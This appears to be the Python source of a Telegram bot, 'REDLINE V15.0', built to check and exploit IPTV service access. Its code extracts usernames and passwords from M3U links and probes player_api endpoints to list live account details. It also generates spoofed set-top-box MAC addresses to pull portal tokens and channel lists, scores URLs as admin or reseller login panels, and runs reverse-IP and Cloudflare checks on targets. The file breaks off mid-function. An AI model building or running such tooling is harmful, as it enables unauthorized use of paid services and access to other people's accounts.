#!/usr/bin/env python3
"""
REDLINE V15.0 ENHANCED Telegram Bot
Complete extraction bot with M3U Checker & Converters
Tier 1 Features: All extractions + M3U tools + Progress tracking

Author: Based on REDLINE V15.0
Bot Version: 3.0 (Complete)
"""

import os
import re
import logging
import asyncio
import time
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, timezone
from typing import List, Set, Tuple, Dict
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)
import telegram
from telegram.constants import ChatAction

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logger.warning("requests not installed - M3U checker disabled")

# ============================================
# BOT CONFIGURATION
# ============================================

# Read sensitive values from environment variables
BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN env var is required")

# Logging configuration
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Temp directory for file processing
TEMP_DIR = 'bot_temp'
os.makedirs(TEMP_DIR, exist_ok=True)

# File size limit (50MB)
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB in bytes

# Proxy configuration (optional)
# Set to None to disable proxy, or provide proxy dict
# HTTP Proxy Example: 
#   PROXY_CONFIG = {'http': 'http://proxy:port', 'https': 'http://proxy:port'}
# SOCKS5 Proxy Example (requires: pip install requests[socks]):
#   PROXY_CONFIG = {'http': 'socks5://proxy:port', 'https': 'socks5://proxy:port'}
PROXY_CONFIG = None  # legacy, overridden by settings if enabled

# ============================================
# ACCESS CONTROL CONFIG
# ============================================
# Allow posting only from these channels; use env CHANNEL_IDS or CHANNEL_ID
_chan_env = (os.environ.get('CHANNEL_IDS') or os.environ.get('CHANNEL_ID') or '').strip()
_chan_list = _chan_env.split(',') if _chan_env else []
ALLOWED_CHANNEL_IDS = set()
for _c in _chan_list:
    _c = _c.strip()
    if not _c:
        continue
    try:
        ALLOWED_CHANNEL_IDS.add(int(_c))
    except Exception:
        # supports "-100..." strings too
        try:
            ALLOWED_CHANNEL_IDS.add(int(_c))
        except Exception:
            pass

# Owner allowlist (comma-separated numeric IDs via env OWNER_IDS)
_owner_env = os.environ.get('OWNER_IDS', '').strip()
OWNER_IDS = set()
if _owner_env:
    for s in _owner_env.split(','):
        s = s.strip()
        if not s:
            continue
        try:
            OWNER_IDS.add(int(s))
        except Exception:
            pass

# ============================================
# SETTINGS (persistent)
# ============================================

SETTINGS_PATH = os.path.join(TEMP_DIR, 'settings.json')
GLOBAL_SETTINGS = {
    'proxy_enabled': False,
    'proxy_value': '',
    'include_channels_auto': False,
    'workers': 12,
    'm3u_limit': 1000,
    'combo_limit': 500,
}

def load_settings():
    try:
        import json
        if os.path.exists(SETTINGS_PATH):
            with open(SETTINGS_PATH, 'r', encoding='utf-8') as f:
                data = json.load(f)
                GLOBAL_SETTINGS.update({k: data.get(k, v) for k, v in GLOBAL_SETTINGS.items()})
    except Exception:
        pass

def save_settings():
    try:
        import json
        with open(SETTINGS_PATH, 'w', encoding='utf-8') as f:
            json.dump(GLOBAL_SETTINGS, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

def get_proxies() -> dict | None:
    if GLOBAL_SETTINGS.get('proxy_enabled') and GLOBAL_SETTINGS.get('proxy_value'):
        pv = GLOBAL_SETTINGS.get('proxy_value').strip()
        scheme = 'http' if pv.startswith(('http://','socks5://')) else 'http'
        return {'http': pv if '://' in pv else f'{scheme}://{pv}', 'https': pv if '://' in pv else f'{scheme}://{pv}'}
    return None

load_settings()

# ============================================
# HTTP helper with retry
# ============================================
class Net:
    @staticmethod
    def get(url: str, timeout: int = 8, proxies: dict | None = None, headers: dict | None = None, allow_redirects: bool = True, stream: bool = False, retries: int = 2, backoff: float = 0.5):
        if not HAS_REQUESTS:
            raise RuntimeError('requests not installed')
        last_exc = None
        for i in range(retries + 1):
            try:
                return requests.get(url, timeout=timeout, proxies=proxies, headers=headers, allow_redirects=allow_redirects, stream=stream)
            except Exception as e:
                last_exc = e
                if i < retries:
                    time.sleep(backoff * (2 ** i))
        raise last_exc

# ============================================
# ACCESS CONTROL: CHANNEL-ONLY GUARD
# ============================================

def allowed_chat(update: Update) -> bool:
    try:
        chat = update.effective_chat
        if not chat:
            return False
        # Channel posts must be from allowed channels
        if chat.type == 'channel':
            try:
                return int(chat.id) in ALLOWED_CHANNEL_IDS
            except Exception:
                return False
        # Allow groups/supergroups only if their chat.id is explicitly whitelisted
        if chat.type in ('group', 'supergroup'):
            try:
                return int(chat.id) in ALLOWED_CHANNEL_IDS
            except Exception:
                return False
        # Private chats only from owners
        if chat.type == 'private':
            user = update.effective_user
            if user:
                try:
                    return int(user.id) in OWNER_IDS
                except Exception:
                    return False
            return False
        # Everything else denied
        return False
    except Exception:
        return False

# ============================================
# RATE LIMITER
# ============================================

_rate_state: Dict[int, Tuple[float, float]] = {}
def _allow_rate(chat_id: int, rate: float = 1.0, burst: int = 3) -> bool:
    now = time.time()
    last, tokens = _rate_state.get(chat_id, (now, float(burst)))
    tokens = min(burst, tokens + (now - last) * rate)
    if tokens >= 1.0:
        _rate_state[chat_id] = (now, tokens - 1.0)
        return True
    _rate_state[chat_id] = (now, tokens)
    return False

# ============================================
# REDLINE V15.0 EXTRACTION ENGINE
# All extraction logic from your script
# ============================================

# ============================================
# M3U LINK CHECKER - TIER 1 FEATURE
# ============================================

class M3UChecker:
    """M3U Link Checker with multi-threaded validation"""
    
    @staticmethod
    def check_single_link(url: str, timeout: int = 5, proxies: dict = None) -> Tuple[str, bool, str]:
        """Check if M3U link is alive"""
        if not HAS_REQUESTS:
            return (url, False, "❌ requests not installed")
        
        try:
            response = requests.head(url, timeout=timeout, allow_redirects=True, proxies=proxies)
            
            if response.status_code == 200:
                return (url, True, "✅ ALIVE")
            elif response.status_code == 403:
                return (url, False, "🔒 FORBIDDEN")
            elif response.status_code == 404:
                return (url, False, "❌ NOT FOUND")
            else:
                return (url, False, f"⚠️ CODE {response.status_code}")
        except requests.exceptions.Timeout:
            return (url, False, "⏱️ TIMEOUT")
        except requests.exceptions.ConnectionError:
            return (url, False, "🔌 CONN ERROR")
        except Exception:
            return (url, False, "❌ ERROR")

    @staticmethod
    def categorize(url: str, timeout: int = 3, proxies: dict | None = None) -> Tuple[str, str]:
        """Enhanced categorize similar to REDLINE: returns (category, details)."""
        if not HAS_REQUESTS:
            return ("ERROR", "requests not installed")
        try:
            headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
            r = Net.get(url, timeout=timeout, allow_redirects=True, proxies=proxies, headers=headers, stream=True)
            status_code = r.status_code
            content = (r.text or "").lower()

            waf_ind = ["cloudflare", "akamai", "imperva", "incapsula", "sucuri", "ddos protection", "rate limit exceeded"]
            vpn_phrases = [
                "access denied", "blocked", "forbidden", "vpn access required",
                "not available in your region", "geo-blocked", "ip blocked"
            ]

            if any(p in content for p in vpn_phrases):
                return ("VPN_NEEDED", f"Geo/WAF block (HTTP {status_code})")
            if any(w in content for w in waf_ind) or status_code in (403, 429, 503):
                return ("WAF", f"WAF/Edge protection (HTTP {status_code})")
            if ("captcha" in content) or ("recaptcha" in content) or ("hcaptcha" in content):
                return ("CAPTCHA", f"CAPTCHA (HTTP {status_code})")
            # Simple valid fingerprint
            if status_code == 200 and any(s in content for s in ["xtream", "player_api", "login", "panel"]):
                return ("VALID", f"HTTP {status_code}")
            if status_code >= 200 and status_code < 400:
                return ("VALID", f"HTTP {status_code}")
            if status_code == 404:
                return ("INVALID", "404 Not Found")
            return ("ERROR", f"HTTP {status_code}")
        except requests.exceptions.Timeout:
            return ("TIMEOUT", "Request timed out")
        except requests.exceptions.SSLError:
            return ("ERROR", "SSL error")
        except requests.exceptions.ConnectionError as e:
            msg = str(e).lower()
            if "name or service not known" in msg or "dns" in msg:
                return ("DNS_ERROR", "DNS failure")
            return ("ERROR", "Connection error")
        except Exception as e:
            return ("ERROR", str(e)[:120])
    
    @staticmethod
    def check_links_batch(links: List[str], max_workers: int = 20, proxies: dict = None) -> Dict:
        """Check multiple links in parallel"""
        results = {'alive': [], 'dead': []}
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(M3UChecker.check_single_link, link, 5, proxies): link 
                      for link in links}
            
            for future in as_completed(futures):
                url, is_alive, status = future.result()
                if is_alive:
                    results['alive'].append((url, status))
                else:
                    results['dead'].append((url, status))
        
        return results

# ============================================
# M3U PROBE (REDLINE-style info)
# ============================================

class M3UProbe:
    @staticmethod
    def _extract_creds(url: str) -> Tuple[str, str, str, str]:
        """Return (base, port, username, password) if found, else empty strings."""
        try:
            p = urlparse(url)
            base = f"{p.scheme}://{p.netloc}"
            port = str(p.port or (443 if p.scheme == 'https' else 80))
            q = parse_qs(p.query)
            u = (q.get('username') or [None])[0]
            pw = (q.get('password') or [None])[0]
            if not u or not pw:
                # try pattern in path
                m = re.search(r"username=([^&\s]+).*password=([^&\s]+)", url, re.IGNORECASE)
                if m:
                    u, pw = m.group(1), m.group(2)
            return base, port, (u or ''), (pw or '')
        except Exception:
            return '', '', '', ''

    @staticmethod
    def _api_url(base: str, username: str, password: str) -> str:
        return f"{base}/player_api.php?username={username}&password={password}"

    @staticmethod
    def probe(url: str, timeout: int = 8, proxies: dict | None = None) -> Tuple[bool, Dict, str]:
        """Query player_api and return structured info for formatting."""
        if not HAS_REQUESTS:
            return False, {}, "requests not installed"
        base, port, username, password = M3UProbe._extract_creds(url)
        if not (base and username and password):
            return False, {}, "credentials not found in URL"
        api = M3UProbe._api_url(base, username, password)
        try:
            r = Net.get(api, timeout=timeout, allow_redirects=True, proxies=proxies, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code != 200:
                return False, {}, f"HTTP {r.status_code}"
            data = r.json() if r.text.strip().startswith('{') else {}
        except Exception as e:
            return False, {}, str(e)

        user = data.get('user_info') or {}
        server = data.get('server_info') or {}
        status = user.get('status') or user.get('auth') or ''
        message = user.get('message') or ''
        active_cons = user.get('active_cons') or 0
        try:
            active_cons = int(active_cons)
        except Exception:
            active_cons = 0
        max_conn = user.get('max_connections') or server.get('max_connections') or 0
        try:
            max_conn = int(max_conn)
        except Exception:
            max_conn = 0
        tz = server.get('timezone') or ''
        srv_url = server.get('url') or urlparse(base).netloc.split(':')[0]
        srv_port = str(server.get('port') or port)
        created_str = user.get('created_at') or ''
        if not created_str and user.get('created_at_timestamp'):
            try:
                created_str = datetime.fromtimestamp(int(user['created_at_timestamp']), tz=timezone.utc).strftime('%Y-%m-%d')
            except Exception:
                created_str = ''
        exp_date = user.get('exp_date') or user.get('expirations_date') or ''
        exp_disp = ''
        days_left = ''
        if exp_date:
            try:
                exp_ts = int(exp_date)
                if exp_ts > 0:
                    exp_dt = datetime.fromtimestamp(exp_ts, tz=timezone.utc)
                    exp_disp = exp_dt.strftime('%Y-%m-%d')
                    days_left_val = (exp_dt - datetime.now(tz=timezone.utc)).days
                    days_left = str(days_left_val)
            except Exception:
                exp_disp = str(exp_date)
        info = {
            'timezone': tz or '-',
            'status': 'Active' if str(status).lower() == 'active' else (status or '-'),
            'active': active_cons,
            'max': max_conn,
            'base': base,
            'url': f"http://{srv_url}/",
            'port': srv_port,
            'username': username,
            'password': password,
            'created': created_str.split(' ')[0] if created_str else '-',
            'expires': exp_disp or '-',
            'days_left': days_left,
            'message': message,
            'm3u': f"{base}/get.php?username={username}&password={password}&type=m3u_plus",
            'api': api,
        }
        return True, info, ''

    @staticmethod
    def format_manual_block(info: Dict) -> str:
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        lines = []
        lines.append(now)
        lines.append("")
        lines.append("\u25cf\u25ba Server Info:")
        lines.append(f"\u25cf\u25ba Server Message: {info.get('message','')}")
        lines.append(f"\u25cf\u25ba Timezone: {info.get('timezone','-')}")
        lines.append(f"\u25cf\u25ba Status: {info.get('status','-')}")
        lines.append(f"\u25cf\u25ba Active Connections: {info.get('active',0)}")
        lines.append(f"\u25cf\u25ba Max Connections: {info.get('max',0)}")
        lines.append(f"\u25cf\u25ba URL: {info.get('url','-')}")
        lines.append(f"\u25cf\u25ba Port: {info.get('port','-')}")
        lines.append(f"\u25cf\u25ba Username: {info.get('username','-')}")
        lines.append(f"\u25cf\u25ba Password: {info.get('password','-')}")
        lines.append(f"\u25cf\u25ba Created: {info.get('created','-')}")
        exp = info.get('expires','-')
        days = info.get('days_left')
        exp_line = f"\u25cf\u25ba Expires: {exp}"
        if days:
            exp_line += f" - {days} Days left"
        lines.append(exp_line)
        ch = info.get('channels')
        if ch:
            lines.append(f"\u26A0\uFE0F Content Channels: \u25ba {ch} \u25c4")
        else:
            lines.append(f"\u26A0\uFE0F Content Channels: ")
        lines.append(f"\u25cf\u25ba M3U: {info.get('m3u','-')}")
        lines.append("----------------------------")
        return "\n".join(lines)

class UpProbe:
    @staticmethod
    def build_m3u(host: str, username: str, password: str) -> str:
        if not host.startswith(('http://','https://')):
            host = 'http://' + host
        base = host.rstrip('/')
        return f"{base}/get.php?username={username}&password={password}&type=m3u_plus"

    @staticmethod
    def probe_up(host: str, username: str, password: str, timeout: int = 8, proxies: dict | None = None) -> Tuple[bool, Dict, str]:
        url = UpProbe.build_m3u(host, username, password)
        return M3UProbe.probe(url, timeout=timeout, proxies=proxies)

    @staticmethod
    def format_auto_block(info: Dict) -> str:
        lines = []
        lines.append("----------------------------")
        lines.append(f" Timezone: {info.get('timezone','-')}")
        lines.append(f" Status: {info.get('status','-')}")
        lines.append(f" Active Connections: {info.get('active',0)}")
        lines.append(f" Max Connections: {info.get('max',0)}")
        lines.append(f" URL: {info.get('url','-')}")
        lines.append(f" Port: {info.get('port','-')}")
        lines.append(f" Username: {info.get('username','-')}")
        lines.append(f" Password: {info.get('password','-')}")
        lines.append(f" Created: {info.get('created','-')}")
        lines.append(f" Expires: {info.get('expires','-')}")
        if info.get('channels'):
            lines.append(f" Content Channels: {info.get('channels')}")
        lines.append(f" M3U: {info.get('m3u','-')}")
        lines.append(f" API: {info.get('api','-')}")
        return "\n".join(lines)

# ============================================
# MAC CONVERTERS - PHASE 1
# ============================================

class MACConverter:
    """MAC format converters"""
    
    @staticmethod
    def _generate_mac() -> str:
        import random
        prefixes = [
            (0x00, 0x1A, 0x79),  # Infomir/MAG
            (0x00, 0x1E, 0xB8),
            (0x00, 0x1F, 0xFB),
        ]
        p = random.choice(prefixes)
        tail = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        parts = list(p) + list(tail)
        return ":".join(f"{b:02X}" for b in parts)

    @staticmethod
    def m3u_to_mac(m3u_text: str, mac_address: str | None = None) -> Set[str]:
        """Convert M3U URLs to MAC live.php URLs using extracted stream ids"""
        results = set()
        if not mac_address:
            mac_address = MACConverter._generate_mac()
        
        for line in m3u_text.split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            try:
                parsed = re.search(r"https?://([^/]+)(/.+)", line, re.IGNORECASE)
                if not parsed:
                    continue
                host = parsed.group(1)
                stream_id = None
                m = re.search(r"[?&]stream=(\d+)", line)
                if m:
                    stream_id = m.group(1)
                if not stream_id:
                    m = re.search(r"/(?:live|movie|series)/[^/]+/[^/]+/(\d+)\.(?:ts|m3u8|mp4)", line, re.IGNORECASE)
                    if m:
                        stream_id = m.group(1)
                if not stream_id:
                    m = re.search(r"/(\d+)\.(?:ts|m3u8|mp4)", line, re.IGNORECASE)
                    if m:
                        stream_id = m.group(1)
                if host and stream_id:
                    results.add(f"http://{host}/play/live.php?mac={mac_address}&stream={stream_id}&extension=ts")
            except Exception:
                continue
        return results

    @staticmethod
    def mac_to_m3u(host: str, mac_address: str, timeout: int = 10) -> Tuple[List[Dict], str]:
        """Fetch channels via portal API and return list of channels (id,name,number,url), or error"""
        if not HAS_REQUESTS:
            return ([], "requests not installed")
        try:
            if not host.startswith(('http://', 'https://')):
                host = 'http://' + host
            from urllib.parse import urlparse
            p = urlparse(host)
            base = f"{p.scheme}://{p.netloc}"
            sess = requests.Session()
            try:
                sess.cookies.update({"mac": mac_address})
            except Exception:
                pass
            # handshake
            try:
                r = sess.get(f"{base}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml", timeout=timeout, allow_redirects=False)
                data = r.json() if r.text.strip().startswith('{') else {}
                token = (data.get('js') or {}).get('token')
            except Exception:
                token = None
            if not token:
                return ([], "Failed to get token from portal")
            headers = {"Authorization": f"Bearer {token}"}
            # channels
            try:
                r = sess.get(f"{base}/server/load.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml", headers=headers, timeout=timeout, allow_redirects=False)
                if r.status_code != 200:
                    return ([], f"HTTP {r.status_code}")
                data = r.json() if r.text.strip().startswith('{') else {}
                arr = (data.get('js') or {}).get('data') or []
                out: List[Dict] = []
                for ch in arr[:500]:
                    try:
                        out.append({
                            'id': ch.get('id', ''),
                            'name': ch.get('name', 'Unknown'),
                            'number': ch.get('number', '0'),
                            'url': ch.get('cmd', ''),
                            'group': ch.get('tv_genre_title') or ch.get('genre_title') or ch.get('genre') or ch.get('cat_title') or ''
                        })
                    except Exception:
                        continue
                return (out, "")
            except Exception as e:
                return ([], f"Channels error: {str(e)}")
        except Exception as e:
            return ([], f"Error: {str(e)}")

    @staticmethod
    def mac_profile(host: str, mac_address: str, timeout: int = 8) -> Dict:
        """Best-effort fetch of subscription/profile info (may include expiry)."""
        if not HAS_REQUESTS:
            return {}
        try:
            if not host.startswith(('http://', 'https://')):
                host = 'http://' + host
            from urllib.parse import urlparse
            p = urlparse(host)
            base = f"{p.scheme}://{p.netloc}"
            sess = requests.Session()
            try:
                sess.cookies.update({"mac": mac_address})
            except Exception:
                pass
            # handshake
            token = None
            try:
                r = sess.get(f"{base}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml", timeout=timeout, allow_redirects=False)
                data = r.json() if r.text.strip().startswith('{') else {}
                token = (data.get('js') or {}).get('token')
            except Exception:
                pass
            if not token:
                return {}
            headers = {"Authorization": f"Bearer {token}"}
            # try profile endpoint
            try:
                r = sess.get(f"{base}/server/load.php?type=stb&action=get_profile&JsHttpRequest=1-xml", headers=headers, timeout=timeout, allow_redirects=False)
                data = r.json() if r.text.strip().startswith('{') else {}
                js = data.get('js') or {}
                # look for common expiry fields
                exp = js.get('end_date') or js.get('expire_date') or js.get('billing_date') or js.get('expire_billing_date') or ''
                return {"expires": str(exp)} if exp else {}
            except Exception:
                return {}
        except Exception:
            return {}

# ============================================
# PANEL TOOLS - PHASE 1 (basic, fast)
# ============================================

class PanelSearcher:
    """Find IPTV/Xtream-like panel URLs in text (REDLINE-matched scoring)"""
    URL_RE = re.compile(r'https?://[^\s<>"{}|\\^`\[\]]+', re.IGNORECASE)

    # ===== Constants from REDLINE (trimmed but equivalent) =====
    PANEL_PATH_HINTS: List[str] = [
        r":\d{2,5}/login\.(php|asp|cgi|jsp|aspx|htm|html)(\?|$)",
        r":\d{2,5}/admin(\?|/|$)",
        r":\d{2,5}/panel(\?|/|$)",
        r":\d{2,5}/dashboard(\?|/|$)",
        r"/(xui|xtream|player_api|stalker|mag|iptv)/?",
        r"/(clientarea|signin|authenticate|cpanel|manager|control|portal|reseller)/?",
        r"/(login|Login)\.(php|asp|jsp|html?)",
    ]
    PANEL_HOST_HINTS: List[str] = [
        "iptv", "ott", "xui", "xc", "xtream", "stalker", "m3u", "mag",
        "xstream", "vpanel", "portal", "4kpanel", "smartiptv", "tvpanel",
        "panel", "reseller", "admin", "dashboard", "cms"
    ]
    PANEL_QUERY_HINTS: List[str] = [
        "referrer=", "ReturnURL=", "rp=/login", "action=login",
        "username=", "password=", "user=", "pass=", "next=",
        "style=", "redirect=", "return_url=", "continue="
    ]
    KNOWN_IPTV_PORTS: Set[int] = {
        80, 443, 1088, 1980, 1992, 1993, 2052, 2080, 2082, 2083, 2086, 2087, 2088, 2095, 2096,
        3000, 3001, 3388, 5555, 5588, 5656, 6688, 6888, 6969, 7392, 7488, 7688, 7720, 7788, 7888,
        8000, 8001, 8010, 8079, 8080, 8081, 8087, 8088, 8181, 8288, 8443, 8877, 8880, 8888,
        9000, 9080, 9443, 9999, 10000, 16000, 20000, 25461, 25500, 25600
    }
    NON_PANEL_KEYWORDS = [
        "checkout", "cart", "order", "payment", "bank", "insurance",
        "university", "passport", "ticket", "shop", "store", "ecommerce",
        "career", "jobs", "hroffice", "instagram", "skyscanner",
    ]
    PANEL_PATH_RE = re.compile("|".join(PANEL_PATH_HINTS), re.IGNORECASE)
    HASH_PATH_RE = re.compile(r"/[A-Za-z0-9]{8,12}/(login|dashboard)", re.IGNORECASE)
    SPA_PATTERN_RE = re.compile(r"/#/(login|auth|dashboard)", re.IGNORECASE)
    ENCODED_PATH_RE = re.compile(r"/admin/index/[A-Za-z0-9=]+")
    PANEL_TYPE_RE = re.compile(r"/(pntv|iptv|cms)/login\.php", re.IGNORECASE)
    IPTV_PATH_RE = re.compile(r"/(iptv|xui|stalker|mag|xtream|panel|admin|reseller|dashboard)\b", re.IGNORECASE)
    PORT_PATH_RE = re.compile(r"/\d{2,5}/(login|admin|panel)", re.IGNORECASE)
    ACCOUNT_PATTERN_RE = re.compile(r"/(Account|account)/(Login|Signin)")
    LOGIN_PATTERN_RE = re.compile(r"/(login|signin|auth|authenticate|clientarea)\.(php|asp|jsp|html?)", re.IGNORECASE)

    @staticmethod
    def score_panel_url(u: str) -> Tuple[int, Set[str], str]:
        reasons: Set[str] = set()
        try:
            p = urlparse(u)
            host = (p.hostname or "").lower()
            path = (p.path or "/").lower()
            query = (p.query or "").lower()
            score = 0

            # Path & special patterns
            if PanelSearcher.PANEL_PATH_RE.search(path):
                score += 3; reasons.add("path")
            if PanelSearcher.HASH_PATH_RE.search(path):
                score += 6; reasons.add("hash_path")
            if PanelSearcher.SPA_PATTERN_RE.search(path):
                score += 5; reasons.add("spa_pattern")
            if PanelSearcher.ENCODED_PATH_RE.search(path):
                score += 5; reasons.add("encoded_path")
            if PanelSearcher.PANEL_TYPE_RE.search(path):
                score += 5; reasons.add("panel_type")
            if PanelSearcher.IPTV_PATH_RE.search(path):
                score += 2; reasons.add("iptv_path")
            if PanelSearcher.PORT_PATH_RE.search(path):
                score += 3; reasons.add("port_path")
            if PanelSearcher.ACCOUNT_PATTERN_RE.search(path):
                score += 4; reasons.add("account_pattern")
            if PanelSearcher.LOGIN_PATTERN_RE.search(path):
                score += 4; reasons.add("login_pattern")

            # Host hints
            host_hits = sum(1 for h in PanelSearcher.PANEL_HOST_HINTS if h in host)
            if host_hits:
                score += min(host_hits, 4)
                reasons.add("host")
            iptv_matches = sum(1 for k in ["iptv","xui","xtream","stalker","panel","reseller"] if k in host)
            if iptv_matches:
                score += min(iptv_matches * 2, 6)
                reasons.add("iptv_host")

            # Subdomain patterns
            if any(host.startswith(sub) for sub in ["cms.","panel.","reseller.","my.","dashboard.","admin."]):
                score += 3; reasons.add("subdomain")

            # Port scoring
            if p.port:
                if p.port in PanelSearcher.KNOWN_IPTV_PORTS:
                    if p.port in [8087,8080,2082,25500,2052,8880]:
                        score += 5
                    else:
                        score += 4
                    reasons.add("known_port")
                elif p.port in [80,443]:
                    score += 1; reasons.add("standard_port")
                else:
                    score += 2; reasons.add("custom_port")

            # Query hints
            if any(q in query for q in ["rp=/login","returnurl=","referrer=","next="]):
                score += 2; reasons.add("query")
            elif any(q in query for q in PanelSearcher.PANEL_QUERY_HINTS):
                score += 1; reasons.add("query")

            # Penalties
            if ("iptv_host" in reasons) and not ("path" in reasons or "iptv_path" in reasons or "known_port" in reasons or "query" in reasons):
                if (path or "/").strip() in ("","/"):
                    score -= 2; reasons.add("host_only")
            if not ("iptv_path" in reasons or "iptv_host" in reasons or "known_port" in reasons):
                if any(k in host or k in path for k in PanelSearcher.NON_PANEL_KEYWORDS):
                    score -= 2; reasons.add("nonpanel")

            normalized = f"{p.scheme}://{p.netloc}{p.path}"
            return score, reasons, normalized
        except Exception:
            return 0, set(), u

    @staticmethod
    def find(text: str) -> Set[str]:
        panels: Set[str] = set()
        for url in PanelSearcher.URL_RE.findall(text):
            try:
                parsed = urlparse(url)
                if parsed.scheme not in ("http","https") or not parsed.netloc:
                    continue
                score, reasons, norm = PanelSearcher.score_panel_url(url)
                iptv_like = ("iptv_path" in reasons) or ("iptv_host" in reasons) or ("known_port" in reasons)
                accept = False
                if ("known_port" in reasons and ("iptv_path" in reasons or "iptv_host" in reasons) and score >= 4):
                    accept = True
                elif (("iptv_host" in reasons and "iptv_path" in reasons) and score >= 4):
                    accept = True
                elif ("iptv_host" in reasons and score >= 5 and ("path" in reasons or "subdomain" in reasons or "query" in reasons or "hash_path" in reasons or "spa_pattern" in reasons)):
                    accept = True
                elif (score >= 6 and iptv_like):
                    accept = True
                if accept and len(norm) <= 120:
                    panels.add(norm)
            except Exception:
                continue
        return panels

class PanelChecker:
    """HEAD check for panel alive/dead"""
    @staticmethod
    def check(url: str, timeout: int = 5, proxies: dict | None = None) -> Tuple[str, bool, str]:
        if not HAS_REQUESTS:
            return (url, False, "❌ requests not installed")
        try:
            r = requests.head(url, timeout=timeout, allow_redirects=True, proxies=proxies)
            if r.status_code == 200:
                return (url, True, "✅ ALIVE")
            elif r.status_code == 403:
                return (url, False, "🔒 FORBIDDEN")
            elif r.status_code == 404:
                return (url, False, "❌ NOT FOUND")
            else:
                return (url, False, f"⚠️ CODE {r.status_code}")
        except requests.exceptions.Timeout:
            return (url, False, "⏱️ TIMEOUT")
        except requests.exceptions.ConnectionError:
            return (url, False, "🔌 CONN ERROR")
        except Exception:
            return (url, False, "❌ ERROR")

# ============================================
# PHASE 2 UTILITIES
# ============================================

class WHOISLookup:
    @staticmethod
    def _is_ip(s: str) -> bool:
        return bool(re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", s))

    @staticmethod
    def _resolve_ip(domain: str) -> str:
        try:
            return socket.gethostbyname(domain)
        except Exception:
            return ''

    @staticmethod
    def _geo_ip(ip: str, timeout: int = 8) -> Dict:
        try:
            r = Net.get(f"https://ipapi.co/{ip}/json/", timeout=timeout)
            return r.json() if r.status_code == 200 else {}
        except Exception:
            return {}

    @staticmethod
    def _rdap_domain(domain: str, timeout: int = 12) -> Dict:
        try:
            r = Net.get(f"https://rdap.org/domain/{domain}", timeout=timeout)
            return r.json() if r.status_code == 200 else {}
        except Exception:
            return {}

    @staticmethod
    def _dns_ns(domain: str, timeout: int = 8) -> List[Dict]:
        out = []
        try:
            r = Net.get(f"https://dns.google/resolve?name={domain}&type=NS", timeout=timeout)
            if r.status_code == 200:
                js = r.json()
                for ans in js.get('Answer', []) or []:
                    host = ans.get('data','').rstrip('.')
                    if host:
                        # resolve NS IP
                        ip = ''
                        try:
                            rr = Net.get(f"https://dns.google/resolve?name={host}&type=A", timeout=timeout)
                            if rr.status_code == 200:
                                arr = rr.json().get('Answer', []) or []
                                if arr:
                                    ip = arr[0].get('data','')
                        except Exception:
                            pass
                        asn = country = org = ''
                        if ip:
                            gi = WHOISLookup._geo_ip(ip, timeout=6)
                            asn = str(gi.get('asn','')) + ' ' + str(gi.get('org','')) if gi.get('asn') else str(gi.get('org',''))
                            country = gi.get('country_name','') or gi.get('country','')
                        out.append({'host': host, 'ip': ip, 'asn': asn.strip(), 'country': country})
        except Exception:
            pass
        return out

    @staticmethod
    def _reverse_ip(ip: str, timeout: int = 12, limit: int = 100) -> List[str]:
        # Use rapiddns sameip page (HTML) and parse domains
        try:
            url = f"https://rapiddns.io/sameip/{ip}?full=1#result"
            r = Net.get(url, timeout=timeout, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code != 200:
                return []
            domains = set()
            for m in re.finditer(r">([A-Za-z0-9._-]+\.[A-Za-z]{2,})<", r.text):
                d = m.group(1)
                # ignore obvious TLD artifacts
                if len(d) <= 2 or d.endswith('...'):
                    continue
                domains.add(d)
                if len(domains) >= limit:
                    break
            return sorted(domains)
        except Exception:
            return []

    @staticmethod
    def whois_report(target: str) -> Tuple[str, str]:
        if not HAS_REQUESTS:
            return (target, "requests not installed")
        t = target.strip()
        domain = t
        ip = t if WHOISLookup._is_ip(t) else ''
        if not ip:
            ip = WHOISLookup._resolve_ip(domain)

        # Reverse IP
        rev_domains = WHOISLookup._reverse_ip(ip) if ip else []
        # Cap preview in report for readability
        preview_limit = 40
        preview_domains = rev_domains[:preview_limit]
        # NS & protection
        ns_list = WHOISLookup._dns_ns(domain) if not WHOISLookup._is_ip(domain) else []
        has_cf = any('cloudflare' in (ns.get('host','')) for ns in ns_list)
        provider = 'cloudflare' if has_cf else 'none'
        cloudflare = 'YES' if has_cf else 'NO'
        bypass = 'NO' if has_cf else 'YES' if provider != 'none' else 'NO'
        # RDAP WHOIS
        rdap = WHOISLookup._rdap_domain(domain) if not WHOISLookup._is_ip(domain) else {}
        # GEO
        geo = WHOISLookup._geo_ip(ip) if ip else {}

        # Build report text
        t0 = time.time()
        lines = []
        lines.append("╭═══════════════════════════════════════╮")
        lines.append("             Who is IP/Domain             ")
        lines.append("            ⚡ REDLINE V15 ⚡            ")
        lines.append(f"             🎯  {domain}             ")
        lines.append(f"           🔎 {ip or '-'}            ")
        lines.append("╰═══════════════════════════════════════╯")
        lines.append("")
        lines.append(f"🎯 Scanning target: {domain} 🔎 {ip or '-'}")
        lines.append("--------------------------------------------------")
        lines.append("")
        lines.append("🌐 Reverse DNS Results Summary")
        lines.append("──────────────────────")
        lines.append(f"📊 Source 2: {len(rev_domains)} domains")
